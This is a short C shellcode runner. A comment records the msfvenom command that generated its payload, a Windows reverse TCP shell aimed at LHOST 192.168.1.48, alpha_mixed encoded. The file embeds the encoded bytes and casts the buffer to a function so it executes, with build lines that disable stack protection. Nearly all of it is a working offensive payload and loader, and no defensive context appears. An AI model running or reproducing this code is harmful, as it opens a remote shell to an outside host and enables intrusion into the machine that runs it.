// <Windows> i686-w64-mingw32-gcc test_shellcode.c -o shellcode
// <Linux> gcc -m32 -fno-stack-protector -z execstack test_shellcode.c -o shellcode

#include <stdio.h>
// msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.48 -f c -v code -e x86/alpha_mixed -b "\x00"
unsigned char code[] = "\x56\x54\x58\x36\x33\x30\x56\x58\x2D\x59\x30\x2E\x30\x2D\x79\x44\x4F\x54\x2D\x7F\x68\x42\x7B\x50\x5B\x56\x58\x2D\x4D\x21\x72\x7F\x2D\x38\x40\x32\x5F\x2D\x7C\x27\x4F\x5E\x64\x33\x36\x56\x50\x5E\x58\x33\x30\x31\x30\x40\x40\x40\x40\x53\x5E\x33\x30\x31\x30\x6A\x30\x59\x38\x29\x58\x54\x58\x2D\x6F\x7A\x4F\x7E\x2D\x2C\x2B\x65\x28\x2D\x6D\x5A\x4B\x59\x50\x5C\x58\x2D\x6F\x6F\x6F\x7E\x2D\x38\x6F\x68\x2D\x2D\x39\x21\x28\x54\x50\x59IIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIyl8hor305PgpcPlIm5TqO0RDnkbp6Pnkbr4LnkBrFtNkBRTh6oLwaZgVTq9oLl5l51al6bDlWPkqjodMwq9W9rzRRrqGNkRr6pnkPJelLKrlFqqhkScxeQkav1LKPYQ0C1xSLKSyb8KSfZ3yNk04lKGqJvtqkOnLyQjoDMFaIWp8m03E8v5SSMYhEkSMFDPuM4PXLKv8fDfa8SavLK4LPKlK3hELFazslKdDnk5QHPLI0Da4utSkqKaq3irzf1kOKPqOaOBzNkR2HklMcmrHDsebGps0E8t7BSVRcoQDu8blbWGV6gyon5OHJ0c1S05PQ98DQDbpE8WYmPBKuPyo8UV0f00PBpqP60cppPRHiz6oKom0ioKelW0jDE3XiPOXWqFPrHWr5PgaSlK9ivbJb0QFsgqxJ9MusDCQ9oxUneO0BT6lioPN381exlQxjPH5oRCf9oHUQxrCPmcTs0NiM3f767rwFQIfaz5Bby3fZBIme6kwPD14ulfagqnmW4VD4PKvWpaTbtbpv6pVF6PFpVBnaFbvccRv58SIxLEok6yohULIKPBn3fBfyofPrHuXlGGmapion5mkzPX5nBBvSXMvLUMmOmYoJuwL6fcL5ZmPikkPSEVemkW7eC3BPo1zs0f3YokeAA";
int main(int argc, char **argv)
{
   printf("Shellcode length: %lu\n", sizeof(code));

   void (*s)() = (void *)code;
   s();

   return 0;
}
